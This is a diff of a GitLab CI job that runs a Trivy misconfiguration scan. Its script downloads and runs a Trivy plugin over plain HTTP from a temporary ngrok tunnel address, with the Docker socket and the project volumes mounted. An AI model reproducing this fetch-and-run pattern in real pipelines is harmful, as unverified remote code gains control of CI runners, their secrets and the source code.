@@ -9,14 +9,27 @@ trivy-misconfig_detection:
     allow_failure: true
     artifacts:
         reports:
-            sast: trivy-misconfig-detect-report.json
+            sast: trivy-misconfig-detection-report.json
     script:
-        - docker pull $TRIVY_IMAGE
-        - docker run --rm
-          -v /var/run/docker.sock:/var/run/docker.sock
-          -v ${CI_PROJECT_DIR}:/glproject
-          $TRIVY_IMAGE plugin run http://271f-176-67-55-113.ngrok-free.app/trivy-gitlab.tar.gz
-          misconfig /glproject -- --report-path="/glproject"
+        - >
+            docker pull $TRIVY_IMAGE
+
+            export CONTAINER_ID=$(docker ps -q -f "label=com.gitlab.gitlab-runner.job.id=$CI_JOB_ID" -f "label=com.gitlab.gitlab-runner.type=build")
+
+            if [ -z "$CONTAINER_ID" ]; then
+                docker run --rm \
+                      -v /var/run/docker.sock:/var/run/docker.sock \
+                      -v ${CI_PROJECT_DIR}:/glproject \
+                      $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
+                      misconfig /glproject -- --report-path="/glproject"
+            else
+                  docker run --rm \
+                      -v /var/run/docker.sock:/var/run/docker.sock \
+                      --volumes-from ${CONTAINER_ID} \
+                      $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
+                      misconfig $CI_PROJECT_DIR -- --report-path=${CI_PROJECT_DIR}
+            fi
+
     rules:
         - if: $SAST_DISABLED
           when: never
